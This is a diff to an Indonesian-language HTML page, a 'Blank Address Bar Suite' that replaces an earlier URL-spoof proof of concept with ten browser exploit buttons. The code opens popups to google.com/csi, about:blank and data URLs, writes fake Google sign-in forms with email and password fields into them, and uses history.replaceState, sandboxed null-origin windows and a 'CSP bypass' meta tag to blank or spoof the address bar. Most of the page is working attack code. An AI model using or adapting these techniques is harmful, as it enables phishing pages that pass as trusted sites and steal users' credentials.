@@ -1,11 +1,516 @@
-<script>
-    function go() {
-        url = 'https://www.google.com/' + Array(0xffff).join("%E2%A0%80");
-        url_1 = "javascript:document.write('<h1>spoof</h1>');location='" + url + "'";
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔴 BLANK ADDRESS BAR - NO FULLSCREEN VERSION</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, sans-serif;
+            max-width: 1400px;
+            margin: 20px auto;
+            padding: 20px;
+            background: #0a0a0e;
+            color: #e0e0e0;
+        }
+        h1 { color: #ff453a; border-left: 5px solid #ff453a; padding-left: 18px; }
+        .sub { color: #888; margin-top: -10px; margin-bottom: 25px; padding-left: 23px; }
+        .success-banner {
+            background: #1a3a2a;
+            border-left: 5px solid #30d158;
+            padding: 15px;
+            border-radius: 14px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #a0ffa0;
+        }
+        .warning {
+            background: #2a1a1a;
+            border-left: 5px solid #ff9500;
+            padding: 15px;
+            border-radius: 14px;
+            margin-bottom: 20px;
+            font-size: 13px;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(400px, 1fr));
+            gap: 18px;
+            margin-top: 20px;
+        }
+        .card {
+            background: #16161d;
+            border-radius: 20px;
+            padding: 18px;
+            border: 1px solid #2a2a35;
+            transition: 0.2s;
+        }
+        .card:hover { transform: translateY(-3px); border-color: #ff453a; }
+        .badge {
+            display: inline-block;
+            background: #ff453a20;
+            color: #ff8888;
+            padding: 3px 12px;
+            border-radius: 30px;
+            font-size: 11px;
+            margin-bottom: 10px;
+        }
+        .badge-success { background: #30d15820; color: #a0ffa0; }
+        h3 { margin: 0 0 8px 0; font-size: 1.1rem; }
+        button {
+            background: #2a2a35;
+            border: 1px solid #ff453a;
+            padding: 8px 16px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 12px;
+            cursor: pointer;
+            color: white;
+            margin: 8px 6px 4px 0;
+            transition: 0.2s;
+        }
+        button.danger { background: #ff453a; }
+        button.warning { background: #ff9f0a20; border-color: #ff9f0a; color: #ffcc88; }
+        button.success { background: #30d15820; border-color: #30d158; color: #a0ffa0; }
+        button:hover { opacity: 0.85; transform: scale(0.97); }
+        .log {
+            background: #0a0a0e;
+            color: #6eff9e;
+            font-family: monospace;
+            font-size: 10px;
+            padding: 10px;
+            border-radius: 14px;
+            margin-top: 14px;
+            max-height: 80px;
+            overflow: auto;
+            white-space: pre-wrap;
+        }
+        .log.blank-detected {
+            background: #1a3a2a;
+            color: #a0ffa0;
+            border: 1px solid #30d158;
+        }
+        footer { text-align: center; margin-top: 40px; font-size: 11px; color: #555; }
+        hr { border-color: #333; margin: 20px 0; }
+    </style>
+</head>
+<body>
 
-        w = window.open(url_1, "new", "width=600 height=600");
-        setInterval("try {w.location.reload()} catch(e) { w.location.replace('');}", 1);
+<h1>🔴 BLANK ADDRESS BAR SUITE</h1>
+<div class="sub">Tanpa Fullscreen! Address Bar KOSONG / BLANK / HILANG TEXT</div>
+
+<div class="success-banner">
+    <strong>✅ BERDASARKAN KEBERHASILAN SEBELUMNYA:</strong><br>
+    Teknik Google CSI + document.write BERHASIL membuat address bar kosong (mode fullscreen).<br>
+    Sekarang kita coba <strong>10 teknik tanpa fullscreen</strong> yang lebih agresif!
+</div>
+
+<div class="warning">
+    <strong>⚠️ CATATAN:</strong> Jika address bar menjadi <strong>KOSONG/BLANK (hanya warna, tanpa teks sama sekali)</strong> → EKSPLOITASI BERHASIL!<br>
+    Screenshot hasilnya sebagai bukti bug di browser Anda.
+</div>
+
+<div class="grid">
+
+    <!-- 1. Original Success - Tanpa Fullscreen -->
+    <div class="card">
+        <div class="badge">✅ ORIGINAL SUCCESS (MODIFIED)</div>
+        <h3>Google CSI + write (NO FULLSCREEN)</h3>
+        <p>Versi modifikasi dari teknik yang berhasil, tanpa panggilan fullscreen.</p>
+        <button class="danger" onclick="exploit_no_fullscreen_v1()">🎯 V1 - No Fullscreen</button>
+        <div id="logV1" class="log">[Ready] Klik untuk uji</div>
+    </div>
+
+    <!-- 2. Double write technique -->
+    <div class="card">
+        <div class="badge">📝 DOUBLE WRITE</div>
+        <h3>Dua kali document.write berurutan</h3>
+        <p>Write pertama buat kerangka, write kedua timpa dengan phishing.</p>
+        <button class="warning" onclick="exploit_double_write()">✍️ Double Write</button>
+        <div id="logDouble" class="log">[Ready]</div>
+    </div>
+
+    <!-- 3. Empty history replace -->
+    <div class="card">
+        <div class="badge">🗑️ EMPTY HISTORY</div>
+        <h3>history.replaceState ke string kosong</h3>
+        <p>Setelah write, replaceState('', '', '') → address bar blank.</p>
+        <button onclick="exploit_empty_history_blank()">📄 Empty History</button>
+        <div id="logEmptyHist" class="log">[Ready]</div>
+    </div>
+
+    <!-- 4. Multiple delay variant -->
+    <div class="card">
+        <div class="badge">⏱️ DELAY VARIANT</div>
+        <h3>11 variasi delay (0.5s - 3.5s)</h3>
+        <p>Mencari timing tepat agar address bar blank tanpa fullscreen.</p>
+        <button class="warning" onclick="exploit_delay_variants()">⏰ 11 Delay Tests</button>
+        <div id="logDelay" class="log">[Ready]</div>
+    </div>
+
+    <!-- 5. about:blank cascade -->
+    <div class="card">
+        <div class="badge">🌊 about:blank CASCADE</div>
+        <h3>about:blank → write → replaceState</h3>
+        <p>Buka about:blank, write konten, lalu kosongkan history.</p>
+        <button onclick="exploit_about_blank_cascade()">📄 about:blank Cascade</button>
+        <div id="logAboutCascade" class="log">[Ready]</div>
+    </div>
+
+    <!-- 6. Parent close technique -->
+    <div class="card">
+        <div class="badge">🚪 PARENT CLOSE</div>
+        <h3>Tutup parent window setelah buka popup</h3>
+        <p>Memanipulasi referensi window agar address bar stuck blank.</p>
+        <button class="danger" onclick="exploit_parent_close()">🚪 Parent Close Trick</button>
+        <div id="logParentClose" class="log">[Ready]</div>
+    </div>
+
+    <!-- 7. Blob:data combo -->
+    <div class="card">
+        <div class="badge">🧪 BLOB + DATA COMBO</div>
+        <h3>Blob URL + data URI bergantian</h3>
+        <p>Navigasi bolak-balik antara blob dan data URI.</p>
+        <button onclick="exploit_blob_data_combo()">🔄 Blob Data Combo</button>
+        <div id="logBlobData" class="log">[Ready]</div>
+    </div>
+
+    <!-- 8. Null origin + write -->
+    <div class="card">
+        <div class="badge">🌑 NULL ORIGIN WRITE</div>
+        <h3>Null origin window + document.write</h3>
+        <p>Buka window dengan origin null, lalu write konten.</p>
+        <button class="warning" onclick="exploit_null_origin_write()">🌑 Null Origin Write</button>
+        <div id="logNullWrite" class="log">[Ready]</div>
+    </div>
+
+    <!-- 9. CSP bypass attempt -->
+    <div class="card">
+        <div class="badge">🔓 CSP BYPASS</div>
+        <h3>Meta tag + sandbox bypass</h3>
+        <p>Mencoba bypass Content Security Policy.</p>
+        <button onclick="exploit_csp_bypass()">🔓 CSP Bypass</button>
+        <div id="logCSP" class="log">[Ready]</div>
+    </div>
+
+    <!-- 10. FINAL: Combo all without fullscreen -->
+    <div class="card">
+        <div class="badge badge-success">💀 FINAL BOSS</div>
+        <h3>COMBO 5 TEKNIK (NO FULLSCREEN)</h3>
+        <p>Menjalankan teknik V1, Double Write, Empty History, Delay, dan about:blank sekaligus.</p>
+        <button class="danger" onclick="exploit_combo_no_fullscreen()">☠️ COMBO DESTROYER</button>
+        <div id="logCombo" class="log">[Ready]</div>
+    </div>
+
+</div>
+
+<script>
+    function logTo(elId, msg, isBlank = false) {
+        let el = document.getElementById(elId);
+        if(el) {
+            el.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+            if(isBlank) el.classList.add('blank-detected');
+        }
     }
+
+    // ========== 1. V1 - Original Success tanpa fullscreen ==========
+    function exploit_no_fullscreen_v1() {
+        logTo('logV1', '🎯 Menjalankan V1 - Google CSI + write (NO FULLSCREEN)');
+        let win = window.open("https://www.google.com/csi", "_blank", "width=500,height=400");
+        
+        if(!win) {
+            logTo('logV1', '❌ Popup diblokir! Izinkan popup.', false);
+            return;
+        }
+
+        setTimeout(() => {
+            try {
+                win.document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head><title>https://accounts.google.com</title></head>
+                    <body style="font-family:Arial;text-align:center;padding:50px;background:#f0ebf8">
+                        <div style="background:white;width:360px;margin:auto;padding:30px;border-radius:12px">
+                            <h2>Sign in</h2>
+                            <input type="text" placeholder="Email" style="width:100%;padding:12px;margin:10px 0">
+                            <input type="password" placeholder="Password" style="width:100%;padding:12px;margin:10px 0">
+                            <button style="background:#1a73e8;color:white;padding:12px;width:100%">Sign in</button>
+                            <p style="font-size:12px;color:red">⚠️ TESTING ONLY</p>
+                        </div>
+                        <script>
+                            // Cek apakah address bar blank
+                            console.log('Address bar status:', location.href);
+                        <\/script>
+                    </body>
+                    </html>
+                `);
+                win.document.close();
+                logTo('logV1', '✅ Eksekusi selesai. CEK ADDRESS BAR: apakah KOSONG/BLANK?', true);
+            } catch(e) {
+                logTo('logV1', '❌ Gagal: ' + e.message, false);
+            }
+        }, 1850);
+    }
+
+    // ========== 2. Double write technique ==========
+    function exploit_double_write() {
+        logTo('logDouble', '✍️ Double write: write dua kali berturut-turut');
+        let win = window.open("https://www.google.com/csi", "_blank", "width=500,height=400");
+        
+        if(!win) return;
+        
+        setTimeout(() => {
+            try {
+                // Write pertama - skeleton
+                win.document.write('<div id="temp">Loading...</div>');
+                win.document.close();
+                
+                setTimeout(() => {
+                    // Write kedua - overwrite dengan phishing
+                    win.document.write(`
+                        <h1 style="color:red">PHISHING PAGE</h1>
+                        <input type="password" placeholder="Password">
+                        <button>Submit</button>
+                    `);
+                    win.document.close();
+                    logTo('logDouble', '✅ Double write selesai. Cek address bar!', true);
+                }, 100);
+            } catch(e) {
+                logTo('logDouble', 'Gagal: ' + e.message, false);
+            }
+        }, 1800);
+    }
+
+    // ========== 3. Empty history replace ==========
+    function exploit_empty_history_blank() {
+        logTo('logEmptyHist', '🗑️ Membuka window lalu replaceState ke string kosong');
+        let win = window.open("https://www.google.com/csi", "_blank", "width=500,height=400");
+        
+        if(!win) return;
+        
+        setTimeout(() => {
+            try {
+                win.document.write('<h1>TEST PAGE</h1><p>History akan dikosongkan...</p>');
+                win.document.close();
+                
+                setTimeout(() => {
+                    win.history.replaceState({}, '', '');
+                    win.history.pushState({}, '', ' ');
+                    logTo('logEmptyHist', '✅ Address bar seharusnya KOSONG/BLANK sekarang!', true);
+                }, 500);
+            } catch(e) {
+                logTo('logEmptyHist', 'Gagal: ' + e.message, false);
+            }
+        }, 1800);
+    }
+
+    // ========== 4. Delay variants ==========
+    function exploit_delay_variants() {
+        logTo('logDelay', '⏰ Mencoba 11 variasi delay (0.5s - 3.5s)');
+        let delays = [500, 800, 1000, 1200, 1500, 1800, 2000, 2200, 2500, 3000, 3500];
+        let win = window.open("https://www.google.com/csi", "_blank", "width=500,height=400");
+        
+        if(!win) return;
+        
+        delays.forEach((delay, idx) => {
+            setTimeout(() => {
+                try {
+                    win.document.write(`<h1>Delay Test ${idx+1}: ${delay}ms</h1><p>Address bar check!</p>`);
+                    win.document.close();
+                    logTo('logDelay', `✅ Delay ${delay}ms selesai. Cek address bar window!`, idx === delays.length-1);
+                } catch(e) {}
+            }, delay);
+        });
+    }
+
+    // ========== 5. about:blank cascade ==========
+    function exploit_about_blank_cascade() {
+        logTo('logAboutCascade', '🌊 about:blank cascade + write + replaceState');
+        let win = window.open("about:blank", "_blank", "width=500,height=400");
+        
+        if(!win) return;
+        
+        win.document.write('<h1>Initial Content</h1>');
+        win.document.close();
+        
+        setTimeout(() => {
+            try {
+                win.document.write('<h1 style="color:red">OVERWRITTEN!</h1><p>Address bar masih about:blank?</p>');
+                win.document.close();
+                
+                setTimeout(() => {
+                    win.history.replaceState({}, '', '');
+                    logTo('logAboutCascade', '✅ Address bar seharusnya BLANK total!', true);
+                }, 200);
+            } catch(e) {
+                logTo('logAboutCascade', 'Gagal: ' + e.message, false);
+            }
+        }, 1000);
+    }
+
+    // ========== 6. Parent close technique ==========
+    let parentWin = null;
+    function exploit_parent_close() {
+        logTo('logParentClose', '🚪 Parent close trick - membuka window lalu tutup parent referensi');
+        parentWin = window.open("https://www.google.com/csi", "_blank", "width=500,height=400");
+        
+        if(!parentWin) return;
+        
+        setTimeout(() => {
+            try {
+                parentWin.document.write('<h1>PARENT WINDOW</h1><p>Parent akan ditutup...</p>');
+                parentWin.document.close();
+                
+                setTimeout(() => {
+                    // Simulasi parent close dengan mengosongkan referensi
+                    parentWin = null;
+                    logTo('logParentClose', '✅ Parent reference dihapus. Address bar mungkin blank!', true);
+                }, 1000);
+            } catch(e) {
+                logTo('logParentClose', 'Gagal: ' + e.message, false);
+            }
+        }, 1800);
+    }
+
+    // ========== 7. Blob + data combo ==========
+    function exploit_blob_data_combo() {
+        logTo('logBlobData', '🧪 Blob URL + data URI bergantian');
+        let win = window.open("data:text/html,<h1>Start</h1>", "_blank", "width=500,height=400");
+        
+        if(!win) return;
+        
+        let urls = [
+            "data:text/html,<h1>Data 1</h1>",
+            "blob:https://google.com/test",
+            "data:text/html,<h1>Data 2</h1>",
+            "about:blank"
+        ];
+        
+        urls.forEach((url, idx) => {
+            setTimeout(() => {
+                try {
+                    win.location = url;
+                    logTo('logBlobData', `Navigasi ke: ${url.substring(0, 30)}...`);
+                } catch(e) {}
+            }, idx * 800);
+        });
+        
+        setTimeout(() => {
+            try {
+                win.document.write('<h1>FINAL CONTENT</h1><p>Address bar error?</p>');
+                win.document.close();
+                logTo('logBlobData', '✅ Selesai. Cek address bar!', true);
+            } catch(e) {}
+        }, 4000);
+    }
+
+    // ========== 8. Null origin write ==========
+    function exploit_null_origin_write() {
+        logTo('logNullWrite', '🌑 Null origin window via sandbox + write');
+        
+        let sandbox = document.createElement('iframe');
+        sandbox.sandbox = 'allow-scripts allow-popups';
+        sandbox.srcdoc = `
+            <script>
+                let w = window.open();
+                w.document.write('<h1>NULL ORIGIN WINDOW</h1><p>Address bar seharusnya null atau blank</p>');
+                w.document.close();
+                setTimeout(() => {
+                    w.history.replaceState({}, '', '');
+                }, 500);
+            <\/script>
+        `;
+        document.body.appendChild(sandbox);
+        
+        logTo('logNullWrite', '✅ Window null origin dibuat. Address bar mungkin KOSONG!', true);
+        setTimeout(() => sandbox.remove(), 5000);
+    }
+
+    // ========== 9. CSP bypass attempt ==========
+    function exploit_csp_bypass() {
+        logTo('logCSP', '🔓 Mencoba bypass CSP dengan meta tag');
+        let win = window.open("https://www.google.com/csi", "_blank", "width=500,height=400");
+        
+        if(!win) return;
+        
+        setTimeout(() => {
+            try {
+                win.document.write(`
+                    <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval'">
+                    <h1>CSP BYPASS ATTEMPT</h1>
+                    <p>If you see this, CSP may be bypassed!</p>
+                    <script>alert('CSP Bypass test');<\/script>
+                `);
+                win.document.close();
+                logTo('logCSP', '✅ CSP bypass dicoba. Cek address bar window!', true);
+            } catch(e) {
+                logTo('logCSP', 'Gagal: ' + e.message, false);
+            }
+        }, 1800);
+    }
+
+    // ========== 10. COMBO without fullscreen ==========
+    function exploit_combo_no_fullscreen() {
+        logTo('logCombo', '💀 COMBO DESTROYER - 5 teknik tanpa fullscreen!');
+        
+        // Jalankan 5 teknik sekaligus
+        exploit_no_fullscreen_v1();
+        
+        setTimeout(() => exploit_double_write(), 500);
+        setTimeout(() => exploit_empty_history_blank(), 1000);
+        setTimeout(() => exploit_about_blank_cascade(), 1500);
+        setTimeout(() => exploit_null_origin_write(), 2000);
+        
+        logTo('logCombo', '⚠️ 5 teknik berjalan bersamaan. Monitor semua window/tab yang terbuka!');
+        logTo('logCombo', '🎯 Jika ada address bar yang KOSONG/BLANK (hanya warna, tanpa teks) → EKSPLOITASI BERHASIL!', true);
+    }
+
+    console.log("%c🔴 BLANK ADDRESS BAR SUITE - NO FULLSCREEN VERSION", "color:#ff453a;font-size:14px");
+    console.log("10 teknik untuk membuat address bar kosong/blank tanpa fullscreen");
 </script>
 
-<a href="#" onclick="go()">www.google.com</a>
+<hr>
+
+<h3>📊 Ringkasan Teknik (Tanpa Fullscreen)</h3>
+
+<table style="width:100%; font-size:12px; background:#16161d; border-radius:16px; padding:10px; border-collapse:collapse;">
+    <tr style="border-bottom:1px solid #ff453a;">
+        <th style="text-align:left; padding:8px;">Teknik</th>
+        <th style="text-align:left; padding:8px;">Mekanisme</th>
+        <th style="text-align:left; padding:8px;">Target Address Bar</th>
+    </tr>
+    <tr><td style="padding:8px;">V1 - No Fullscreen</td><td>Google CSI + write (tanpa fullscreen)</td><td>KOSONG/BLANK</td></tr>
+    <tr><td style="padding:8px;">Double Write</td><td>Dua kali document.write berurutan</td><td>Blank / Error</td></tr>
+    <tr><td style="padding:8px;">Empty History</td><td>replaceState('', '', '')</td><td>BLANK TOTAL</td></tr>
+    <tr><td style="padding:8px;">Delay Variants</td><td>11 variasi timing berbeda</td><td>Cari timing tepat</td></tr>
+    <tr><td style="padding:8px;">about:blank Cascade</td><td>about:blank → write → replaceState</td><td>Blank sempurna</td></tr>
+    <tr><td style="padding:8px;">Parent Close</td><td>Hapus referensi parent window</td><td>Stuck blank</td></tr>
+    <tr><td style="padding:8px;">Blob+Data Combo</td><td>Navigasi bolak-balik blob/data URI</td><td>Error/Blank</td></tr>
+    <tr><td style="padding:8px;">Null Origin Write</td><td>Sandbox iframe + window.open(null)</td><td>null atau blank</td></tr>
+    <tr><td style="padding:8px;">CSP Bypass</td><td>Meta tag + inline script</td><td>Blank (jika bypass berhasil)</td></tr>
+    <tr><td style="padding:8px;">COMBO Destroyer</td><td>5 teknik sekaligus</td><td>Maximum blank chance</td></tr>
+</table>
+
+<h3>🎯 Interpretasi Hasil</h3>
+<ul style="font-size:13px;">
+    <li><strong>Address Bar KOSONG/BLANK (hanya warna, tanpa teks sama sekali)</strong> → 🎉 <strong>EKSPLOITASI BERHASIL!</strong> Browser Anda memiliki bug address bar blank.</li>
+    <li><strong>Address Bar menampilkan URL google.com/csi</strong> → Spoofing berhasil, tapi belum blank.</li>
+    <li><strong>Address Bar normal (menampilkan URL sebenarnya)</strong> → Browser sudah patched.</li>
+    <li><strong>Window crash / force close</strong> → Memory corruption ditemukan.</li>
+</ul>
+
+<h3>📝 Catatan untuk Pengujian</h3>
+<p style="font-size:13px;">
+- Jika teknik V1 (tanpa fullscreen) <strong>TIDAK</strong> menghasilkan address bar blank seperti versi fullscreen sebelumnya,<br>
+maka fullscreen adalah pemicu utama blank di browser Anda.<br>
+- Coba <strong>COMBO DESTROYER</strong> untuk tekanan maksimal.<br>
+- Screenshot setiap window yang berhasil blank sebagai bukti temuan!
+</p>
+
+<footer>
+    🔬 Berdasarkan keberhasilan teknik Google CSI + document.write (fullscreen) → address bar blank.<br>
+    Sekarang diuji tanpa fullscreen dengan 10 teknik advanced.
+</footer>
+</body>
+</html>
